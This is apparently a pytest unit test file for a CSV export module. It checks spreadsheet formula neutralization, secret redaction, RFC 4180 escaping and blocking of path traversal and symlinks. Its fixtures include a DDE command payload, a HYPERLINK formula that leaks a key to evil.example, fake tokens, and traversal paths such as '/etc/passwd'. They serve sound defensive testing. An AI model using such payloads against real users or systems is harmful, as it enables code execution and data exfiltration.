"""Unit tests for RFC 4180 CSV export sanitization, secret redaction, metric states, and safe paths."""

from __future__ import annotations

import csv
import io
from pathlib import Path

import pytest

from app.core.exceptions import AppError, ErrorCode
from app.modules.reporting.csv_export import (
    format_metric_csv_cell,
    resolve_safe_artifact_path,
    sanitize_csv_cell,
    serialize_csv_rows,
)


class TestCsvFormulaNeutralization:
    @pytest.mark.parametrize(
        ("dangerous", "expected"),
        [
            ("=1+1", "'=1+1"),
            ("=CMD|' /C calc'!A0", "'=CMD|' /C calc'!A0"),
            ("+SUM(A1:A10)", "'+SUM(A1:A10)"),
            ("-2+3", "'-2+3"),
            ("@SUM(A1:A10)", "'@SUM(A1:A10)"),
            ("   =1+1", "'   =1+1"),
            ("\n+cmd", "'\n+cmd"),
            ("\tleading-tab", "'\tleading-tab"),
            ("\rleading-cr", "'\rleading-cr"),
        ],
    )
    def test_neutralizes_spreadsheet_formula_prefixes(self, dangerous: str, expected: str) -> None:
        assert sanitize_csv_cell(dangerous) == expected

    def test_preserves_genuine_numeric_values_unprefixed(self) -> None:
        assert sanitize_csv_cell(0) == "0"
        assert sanitize_csv_cell(0.0) == "0.0"
        assert sanitize_csv_cell(-0.0) == "0.0"
        assert sanitize_csv_cell(68.5) == "68.5"
        assert sanitize_csv_cell(100) == "100"
        assert sanitize_csv_cell(-12.5) == "-12.5"
        assert sanitize_csv_cell(None) == ""


class TestMetricStateFormatting:
    def test_strictly_distinguishes_zero_na_failed_and_timeout(self) -> None:
        assert sanitize_csv_cell(format_metric_csv_cell("MEASURED", 0.0)) == "0.0"
        assert sanitize_csv_cell(format_metric_csv_cell("MEASURED", 0)) == "0.0"
        assert sanitize_csv_cell(format_metric_csv_cell("MEASURED", 84.25)) == "84.25"
        assert sanitize_csv_cell(format_metric_csv_cell("N/A", None)) == "N/A"
        assert sanitize_csv_cell(format_metric_csv_cell("FAILED", None)) == "FAILED"
        assert sanitize_csv_cell(format_metric_csv_cell("TIMEOUT", None)) == "TIMEOUT"

    def test_rejects_measured_without_numeric_value_or_unknown_state(self) -> None:
        with pytest.raises(ValueError):
            format_metric_csv_cell("MEASURED", None)
        with pytest.raises(ValueError):
            format_metric_csv_cell("MEASURED", float("nan"))
        with pytest.raises(ValueError):
            format_metric_csv_cell("BOGUS_STATE", None)


class TestSecretRedactionAndRfc4180:
    def test_redacts_known_secrets_and_neutralizes_combined_formula_payloads(self) -> None:
        raw_formula_secret = '=HYPERLINK("https://evil.example?key=gsk_abcdefghijklmnop123456")'
        cleaned = sanitize_csv_cell(raw_formula_secret)
        assert cleaned.startswith("'=")
        assert "gsk_" not in cleaned
        assert "[REDACTED]" in cleaned

        bearer_cell = sanitize_csv_cell(
            "Error Authorization: Bearer secretTokenAbcdef123456 with sk-abcdefghijklmnop123456",
            extra_secrets=("custom-vault-secret-xyz",),
        )
        assert "secretTokenAbcdef123456" not in bearer_cell
        assert "sk-abcdefghijklmnop123456" not in bearer_cell
        assert "[REDACTED]" in bearer_cell

        extra_cell = sanitize_csv_cell(
            "Upstream leaked custom-vault-secret-xyz",
            extra_secrets=("custom-vault-secret-xyz",),
        )
        assert "custom-vault-secret-xyz" not in extra_cell
        assert "[REDACTED]" in extra_cell

    def test_rfc4180_crlf_and_quoted_escaping(self) -> None:
        headers = ["suite_name", "coverage", "mutation_score", "notes"]
        rows = [
            [
                '=Suite, "Alpha"\nLine2',
                format_metric_csv_cell("MEASURED", 0.0),
                format_metric_csv_cell("N/A", None),
                "Upstream AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz1234 failed",
            ]
        ]
        csv_text = serialize_csv_rows(headers, rows)
        assert "\r\n" in csv_text
        assert "AIzaSy" not in csv_text

        parsed = list(csv.reader(io.StringIO(csv_text), dialect="excel"))
        assert parsed[0] == headers
        assert parsed[1] == [
            '\'=Suite, "Alpha"\nLine2',
            "0.0",
            "N/A",
            "Upstream [REDACTED] failed",
        ]


class TestSafeArtifactPathResolution:
    def test_allows_valid_relative_artifact_path(self, tmp_path: Path) -> None:
        artifact_root = tmp_path / "artifacts"
        target = artifact_root / "proj-1" / "job-1" / "run-1.py"
        target.parent.mkdir(parents=True)
        target.write_text("def test_ok():\n    assert 1 == 1\n", encoding="utf-8")

        resolved = resolve_safe_artifact_path(artifact_root, "proj-1/job-1/run-1.py")
        assert resolved == target.resolve()

    @pytest.mark.parametrize(
        "bad_relpath",
        [
            "",
            "   ",
            "../outside.py",
            "proj-1/../../outside.py",
            "/etc/passwd",
        ],
    )
    def test_blocks_path_traversal_and_absolute_paths(
        self, tmp_path: Path, bad_relpath: str
    ) -> None:
        artifact_root = tmp_path / "artifacts"
        artifact_root.mkdir(parents=True)
        with pytest.raises(AppError) as exc_info:
            resolve_safe_artifact_path(artifact_root, bad_relpath)
        assert exc_info.value.code == ErrorCode.ACCESS_DENIED

    def test_blocks_symlinked_file_and_symlinked_directory(self, tmp_path: Path) -> None:
        artifact_root = tmp_path / "artifacts"
        project_dir = artifact_root / "proj-1"
        project_dir.mkdir(parents=True)

        outside_secret = tmp_path / "outside_secret.txt"
        outside_secret.write_text("do-not-delete", encoding="utf-8")

        symlink_file = project_dir / "link_run.py"
        symlink_file.symlink_to(outside_secret)

        with pytest.raises(AppError) as exc_info:
            resolve_safe_artifact_path(artifact_root, "proj-1/link_run.py")
        assert exc_info.value.code == ErrorCode.ACCESS_DENIED
        assert outside_secret.exists()

        outside_dir = tmp_path / "outside_dir"
        outside_dir.mkdir()
        (outside_dir / "nested.py").write_text("keep", encoding="utf-8")
        symlink_dir = project_dir / "linked_job"
        symlink_dir.symlink_to(outside_dir, target_is_directory=True)

        with pytest.raises(AppError) as dir_exc:
            resolve_safe_artifact_path(artifact_root, "proj-1/linked_job/nested.py")
        assert dir_exc.value.code == ErrorCode.ACCESS_DENIED
